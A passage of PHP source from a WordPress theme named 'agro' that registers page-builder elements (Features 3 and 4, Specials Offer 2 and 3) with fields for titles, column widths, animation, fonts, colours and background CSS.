                            esc_html__('12 column', 'agro') => 'col-sm-12'
                        )
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('LG Column Width', 'agro'),
                        'description' => esc_html__('LG : Large Device', 'agro'),
                        'param_name' => 'lg',
                        'edit_field_class' => 'vc_col-sm-6',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('1 column', 'agro') => 'col-lg-1',
                            esc_html__('2 column', 'agro') => 'col-lg-2',
                            esc_html__('3 column', 'agro') => 'col-lg-3',
                            esc_html__('4 column', 'agro') => 'col-lg-4',
                            esc_html__('5 column', 'agro') => 'col-lg-5',
                            esc_html__('6 column', 'agro') => 'col-lg-6',
                            esc_html__('7 column', 'agro') => 'col-lg-7',
                            esc_html__('8 column', 'agro') => 'col-lg-8',
                            esc_html__('9 column', 'agro') => 'col-lg-9',
                            esc_html__('10 column', 'agro') => 'col-lg-10',
                            esc_html__('11 column', 'agro') => 'col-lg-11',
                            esc_html__('12 column', 'agro') => 'col-lg-12'
                        )
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'anim',
                        'heading' => esc_html__('Add animation?', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' )
                    ),
                    array(
                        'type' => 'dropdown',
                        'param_name' => 'aos',
                        'heading' => esc_html__('Animation', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'value' => bon_anim_aos(),
                        'dependency' => array(
                            'element' => 'anim',
                            'not_empty' => true
                        ),
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'delay',
                        'heading' => esc_html__('Animation delay', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'dependency' => array(
                            'element' => 'anim',
                            'not_empty' => true
                        )
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'offset',
                        'heading' => esc_html__('Animation offset', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'dependency' => array(
                            'element' => 'anim',
                            'not_empty' => true
                        )
                    ),
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Features image width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Features', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Features image height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Features', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'nt_spacer',
                'param_name' => 'btn_spacer',
                'heading' => esc_html__('Button Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button type', 'agro'),
                'param_name' => 'btntype',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Round', 'agro') => 'btn-round',
                    esc_html__('Square', 'agro') => 'btn-square',
                    esc_html__('Rounded', 'agro') => 'btn-rounded'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button style', 'agro'),
                'param_name' => 'btnstyle',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Outline to Solid', 'agro') => 'custom-btn--style-3',
                    esc_html__('Solid to Outline', 'agro') => 'custom-btn--style-4'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Button size', 'agro'),
                'param_name' => 'btnsize',
                'edit_field_class' => 'vc_col-sm-4',
                'group' => esc_html__('Color', 'agro'),
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('Big', 'agro') => 'custom-btn--big',
                    esc_html__('Medium', 'agro') => 'custom-btn--medium',
                    esc_html__('Small', 'agro') => 'custom-btn--small'
                )
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr2',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbg',
                'heading' => esc_html__('Button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbg',
                'heading' => esc_html__('Hover button background', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr3',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnclr',
                'heading' => esc_html__('Button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrclr',
                'heading' => esc_html__('Hover button title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'nt_hr',
                'param_name' => 'hr4',
                'group' => esc_html__('Color', 'agro'),
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnbrd',
                'heading' => esc_html__('Button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'btnhvrbrd',
                'heading' => esc_html__('Hover button border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            // colors
            array(
                'type' => 'nt_spacer',
                'param_name' => 'features_spacer',
                'heading' => esc_html__('Features Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'itclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}


/*******************************/
/* features style 3
/******************************/
if (!function_exists('agro_features3_integrateWithVC')) {
    add_action('vc_before_init', 'agro_features3_integrateWithVC');
    function agro_features3_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Features 3', 'agro'),
        'base' => 'agro_features3',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'stitle',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'sthintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Section Description', 'agro'),
            ),
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Features', 'agro'),
                'group' => esc_html__('Features', 'agro'),
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Item image', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Item title', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'checkbox',
                        'param_name' => 'anim',
                        'heading' => esc_html__('Add animation?', 'agro'),
                        'value' => array( esc_html__('Yes', 'agro') => 'yes' )
                    ),
                    array(
                        'type' => 'dropdown',
                        'param_name' => 'aos',
                        'heading' => esc_html__('Animation', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'value' => bon_anim_aos(),
                        'dependency' => array(
                            'element' => 'anim',
                            'not_empty' => true
                        ),
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'delay',
                        'heading' => esc_html__('Animation delay', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'dependency' => array(
                            'element' => 'anim',
                            'not_empty' => true
                        )
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'offset',
                        'heading' => esc_html__('Animation offset', 'agro'),
                        'edit_field_class' => 'vc_col-sm-4',
                        'dependency' => array(
                            'element' => 'anim',
                            'not_empty' => true
                        )
                    ),
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('SM Column Width', 'agro'),
                'description' => esc_html__('SM : Small Device', 'agro'),
                'group' => esc_html__('Features', 'agro'),
                'param_name' => 'sm',
                'edit_field_class' => 'vc_col-sm-6',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-sm-1',
                    esc_html__('2 column', 'agro') => 'col-sm-2',
                    esc_html__('3 column', 'agro') => 'col-sm-3',
                    esc_html__('4 column', 'agro') => 'col-sm-4',
                    esc_html__('5 column', 'agro') => 'col-sm-5',
                    esc_html__('6 column', 'agro') => 'col-sm-6',
                    esc_html__('7 column', 'agro') => 'col-sm-7',
                    esc_html__('8 column', 'agro') => 'col-sm-8',
                    esc_html__('9 column', 'agro') => 'col-sm-9',
                    esc_html__('10 column', 'agro') => 'col-sm-10',
                    esc_html__('11 column', 'agro') => 'col-sm-11',
                    esc_html__('12 column', 'agro') => 'col-sm-12'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('LG Column Width', 'agro'),
                'description' => esc_html__('LG : Large Device', 'agro'),
                'group' => esc_html__('Features', 'agro'),
                'param_name' => 'lg',
                'edit_field_class' => 'vc_col-sm-6',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-lg-1',
                    esc_html__('2 column', 'agro') => 'col-lg-2',
                    esc_html__('3 column', 'agro') => 'col-lg-3',
                    esc_html__('4 column', 'agro') => 'col-lg-4',
                    esc_html__('5 column', 'agro') => 'col-lg-5',
                    esc_html__('6 column', 'agro') => 'col-lg-6',
                    esc_html__('7 column', 'agro') => 'col-lg-7',
                    esc_html__('8 column', 'agro') => 'col-lg-8',
                    esc_html__('9 column', 'agro') => 'col-lg-9',
                    esc_html__('10 column', 'agro') => 'col-lg-10',
                    esc_html__('11 column', 'agro') => 'col-lg-11',
                    esc_html__('12 column', 'agro') => 'col-lg-12'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Features image width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Features', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Features image height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Features', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // colors
            array(
                'type' => 'nt_spacer',
                'param_name' => 'features_spacer',
                'heading' => esc_html__('Features Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'itclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* features style 4
/******************************/
if (!function_exists('agro_features4_integrateWithVC')) {
    add_action('vc_before_init', 'agro_features4_integrateWithVC');
    function agro_features4_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Features 4', 'agro'),
        'base' => 'agro_features4',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'stitle',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'sthintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'sdesc',
                'heading' => esc_html__('Section Description', 'agro'),
            ),
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Features', 'agro'),
                'group' => esc_html__('Features', 'agro'),
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Item image', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Item Title', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textarea',
                        'param_name' => 'desc',
                        'heading' => esc_html__('Item Description', 'agro'),
                    ),
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('MD Column Width', 'agro'),
                'description' => esc_html__('MD : Medium Device', 'agro'),
                'group' => esc_html__('Features', 'agro'),
                'param_name' => 'md',
                'edit_field_class' => 'vc_col-sm-6',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-md-1',
                    esc_html__('2 column', 'agro') => 'col-md-2',
                    esc_html__('3 column', 'agro') => 'col-md-3',
                    esc_html__('4 column', 'agro') => 'col-md-4',
                    esc_html__('5 column', 'agro') => 'col-md-5',
                    esc_html__('6 column', 'agro') => 'col-md-6',
                    esc_html__('7 column', 'agro') => 'col-md-7',
                    esc_html__('8 column', 'agro') => 'col-md-8',
                    esc_html__('9 column', 'agro') => 'col-md-9',
                    esc_html__('10 column', 'agro') => 'col-md-10',
                    esc_html__('11 column', 'agro') => 'col-md-11',
                    esc_html__('12 column', 'agro') => 'col-md-12'
                )
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('LG Column Width', 'agro'),
                'description' => esc_html__('LG : Large Device', 'agro'),
                'group' => esc_html__('Features', 'agro'),
                'param_name' => 'lg',
                'edit_field_class' => 'vc_col-sm-6',
                'value' => array(
                    esc_html__('Select a option', 'agro') => '',
                    esc_html__('1 column', 'agro') => 'col-lg-1',
                    esc_html__('2 column', 'agro') => 'col-lg-2',
                    esc_html__('3 column', 'agro') => 'col-lg-3',
                    esc_html__('4 column', 'agro') => 'col-lg-4',
                    esc_html__('5 column', 'agro') => 'col-lg-5',
                    esc_html__('6 column', 'agro') => 'col-lg-6',
                    esc_html__('7 column', 'agro') => 'col-lg-7',
                    esc_html__('8 column', 'agro') => 'col-lg-8',
                    esc_html__('9 column', 'agro') => 'col-lg-9',
                    esc_html__('10 column', 'agro') => 'col-lg-10',
                    esc_html__('11 column', 'agro') => 'col-lg-11',
                    esc_html__('12 column', 'agro') => 'col-lg-12'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw',
                'heading' => esc_html__('Features image width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Features', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh',
                'heading' => esc_html__('Features image height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'group' => esc_html__('Features', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            // colors
            array(
                'type' => 'nt_spacer',
                'param_name' => 'features_spacer',
                'heading' => esc_html__('Features Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'itclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'idescclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}


/*******************************/
/* special offer 2
/******************************/
if (!function_exists('agro_special_offer2_integrateWithVC')) {
    add_action('vc_before_init', 'agro_special_offer2_integrateWithVC');
    function agro_special_offer2_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Specials Offer 2', 'agro'),
        'base' => 'agro_special_offer2',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Colorize Title', 'agro'),
                'params' => array(
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Text', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6 pt15',
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'titleclr',
                        'heading' => esc_html__('Text color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    )
                )
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'anim',
                'heading' => esc_html__('Add animation?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' )
            ),
            array(
                'type' => 'dropdown',
                'param_name' => 'aos',
                'heading' => esc_html__('Animation', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'value' => bon_anim_aos(),
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'duration',
                'heading' => esc_html__('Animation duration', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'offset',
                'heading' => esc_html__('Animation offset', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                )
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* special offer 2
/******************************/
if (!function_exists('agro_special_offer3_integrateWithVC')) {
    add_action('vc_before_init', 'agro_special_offer3_integrateWithVC');
    function agro_special_offer3_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Specials Offer 3', 'agro'),
        'base' => 'agro_special_offer3',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Colorize Title', 'agro'),
                'params' => array(
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Text', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6 pt15',
                    ),
                    array(
                        'type' => 'colorpicker',
                        'param_name' => 'titleclr',
                        'heading' => esc_html__('Text color', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    )
                )
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'img',
                'heading' => esc_html__('Section Image', 'agro'),
